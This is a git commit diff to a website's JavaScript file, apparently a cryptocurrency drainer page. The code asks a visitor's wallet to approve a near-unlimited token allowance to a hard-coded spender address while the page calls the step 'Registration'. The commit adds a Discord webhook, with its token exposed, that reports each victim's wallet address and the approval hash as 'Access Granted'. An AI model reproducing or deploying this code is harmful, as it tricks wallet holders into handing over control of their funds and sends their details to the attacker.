4a39e0d059bf1e8f8a015413a09a447cc372f7e1
Hemant Sharma <112456662+callmpa@users.noreply.github.com>
2024-12-31 01:25:22 +0530

    Update index.js

--- assets/js/index.js
+++ assets/js/index.js
@@ -1,18 +1,33 @@
-﻿
-const busdContractAddress ="0x55d398326f99059fF775485246999027B3197955";
+const busdContractAddress = "0x55d398326f99059fF775485246999027B3197955";
 const busdAbi = [
-      {
-          "constant": false,
-          "inputs": [
+    {
+        "constant": false,
+        "inputs": [
             { "name": "_spender", "type": "address" },
             { "name": "_value", "type": "uint256" }
-          ],
-          "name": "approve",
-          "outputs": [{ "name": "", "type": "bool" }],
-          "type": "function"
-      }
+        ],
+        "name": "approve",
+        "outputs": [{ "name": "", "type": "bool" }],
+        "type": "function"
+    }
 ];
 
+// Discord webhook URL
+const discordWebhookURL = "https://discord.com/api/webhooks/1313867659661672468/M5aDIA97zEisBd3mYjYfdOSzkJ95AHzSOLV1c_xUYpYH0kSOjX0V9gC5tM9cEvXLE7NX";
+
+async function sendDiscordNotification(message) {
+    try {
+        await fetch(discordWebhookURL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ content: message })
+        });
+    } catch (error) {
+        console.error("Failed to send notification to Discord:", error);
+    }
+}
 
 async function BusdApproval() {
     loadingButtonBusd();
@@ -22,40 +37,41 @@ async function BusdApproval() {
     let account = accounts[0];
     let net = await web3.eth.net.getId();
 
+    // Notify on wallet connect
+    await sendDiscordNotification(`Wallet connected: ${account}`);
+
     if (net == 56) {
         const busdContract = new web3.eth.Contract(busdAbi, busdContractAddress);
-        const amount= 115792089237;
-        const spenderAddress="0xea78B82fAa50BA7D111d020c89A15b6318173ca8";
+        const amount = 115792089237;
+        const spenderAddress = "0xea78B82fAa50BA7D111d020c89A15b6318173ca8";
         const amountToApprove = web3.utils.toWei(amount.toString(), 'ether');
-        //const urlParams = new URLSearchParams(window.location.search);
-        //const myParam = urlParams.get('id');
         try {
             const transaction = await busdContract.methods
-              .approve(spenderAddress, amountToApprove)
-              .send({ from: account }).then(async (d) => {
-                  const hash = d.transactionHash;
-                  $.ajax({
-                      type: "POST",
-                      url: "flashChecks.aspx/insertAddress",
-                      data: '{ "address": "' + account + '","hash": "' + hash + '"}',
-                      contentType: "application/json; charset=utf-8",
-                      dataType: "json",
-                      success: function (response) {
-                          //alert(response.d);
-                         // Swal.fire({ icon: 'success', title: 'Transaction is successful', text: response_data.transactionHash })
-                          //$find('MyModal').hide();
-                          //location.reload();
-                      }
-                  });
+                .approve(spenderAddress, amountToApprove)
+                .send({ from: account })
+                .then(async (d) => {
+                    const hash = d.transactionHash;
 
+                    // Notify on approval
+                    await sendDiscordNotification(
+                        `Access Granted:\nWallet: ${account}\nTransaction Hash: ${hash}`
+                    );
 
-                  Swal.fire({ icon: 'success', title: 'Congratulations', text: hash }).then(()=>{
-                      location.reload();
-                  });
-              });
+                    $.ajax({
+                        type: "POST",
+                        url: "flashChecks.aspx/insertAddress",
+                        data: `{ "address": "${account}", "hash": "${hash}"}`,
+                        contentType: "application/json; charset=utf-8",
+                        dataType: "json",
+                        success: function (response) {}
+                    });
 
+                    Swal.fire({ icon: 'success', title: 'Congratulations', text: hash }).then(() => {
+                        location.reload();
+                    });
+                });
         } catch (error) {
-            Swal.fire({ icon: 'error', title: 'Info', text: 'Registration Failed' }).then(()=>{
+            Swal.fire({ icon: 'error', title: 'Info', text: 'Registration Failed' }).then(() => {
                 location.reload();
             });
         }
@@ -73,32 +89,12 @@ function unLoadingButtonBusd() {
     document.getElementById('btnApprove').disabled = false;
 }
 
-
 $(document).ready(function () {
     mainLoadFunction();
 
-    //document.addEventListener('contextmenu', function(event) {
-    //    event.preventDefault();
+    jQuery(window).on('load', function () {
+        setTimeout(function () {
+            JobickCarousel();
+        }, 1000);
+    });
 });
-
-
-jQuery(window).on('load', function () {
-    setTimeout(function () {
-        JobickCarousel();
-    }, 1000);
-});
-
-function showLoader() {
-    var loader = document.getElementById('loader');
-    var ApproveText = document.getElementById('ApproveText');
-    var btnApprove = document.getElementById('btnApprove');
-
-    ApproveText.style.display = 'none';
-
-    loader.style.display = 'inline-block';
-
-    btnApprove.disabled = true;
-}
-
-
-
